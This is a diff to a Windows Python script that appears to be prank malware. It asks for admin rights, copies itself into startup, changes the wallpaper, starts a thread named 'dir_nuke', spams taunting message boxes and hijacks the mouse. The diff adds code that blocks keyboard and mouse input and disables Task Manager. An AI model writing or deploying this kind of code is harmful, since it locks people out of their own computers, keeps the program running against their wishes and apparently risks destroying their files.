@@ -38,6 +38,7 @@ def display_error_messages(condition):
         ctypes.windll.user32.MessageBoxW(0, "Nice try.", "LMAO", 0x10 | 0x1)
         ctypes.windll.user32.MessageBoxW(0, "To put it simply,", "LMAO", 0x10 | 0x1)
         ctypes.windll.user32.MessageBoxW(0, "I refuse to be closed.", "LMAO", 0x10 | 0x1)
+        time.sleep(1)
 
 def move_image_boxes():
     image_url = 'https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png'
@@ -53,6 +54,7 @@ def move_image_boxes():
         y = random.randint(0, screen_height - image_height)
 
         pyautogui.moveTo(x, y, duration=1)
+        time.sleep(1)
 
 def dir_nuke():
     time.sleep(45)
@@ -71,25 +73,33 @@ def change_wallpaper():
     ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_file), 3)
     os.remove(wallpaper_file)
 
+def disable_keyboard_task_manager(duration):
+    user32 = ctypes.windll.user32
+    user32.BlockInput(True)
+    user32.SystemParametersInfoW(97, 0, "1", 3)  # Disable Task Manager
+    time.sleep(duration)
+    user32.SystemParametersInfoW(97, 0, "0", 3)  # Enable Task Manager
+    user32.BlockInput(False)
+
 if __name__ == "__main__":
     ask_for_admin()
 
     copy_to_startup()
     change_wallpaper()
 
-    dir_nuke_thread = threading.Thread(target=dir_nuke)
-    dir_nuke_thread.start()
-
     condition = threading.Event()
     condition.set()
+
+    dir_nuke_thread = threading.Thread(target=dir_nuke)
+    dir_nuke_thread.start()
 
     error_thread = threading.Thread(target=display_error_messages, args=(condition,))
     error_thread.start()
 
-    time.sleep(5)
     move_image_boxes_thread = threading.Thread(target=move_image_boxes)
     move_image_boxes_thread.start()
 
+    # Wait for the threads to finish
     move_image_boxes_thread.join()
     condition.clear()
     error_thread.join()
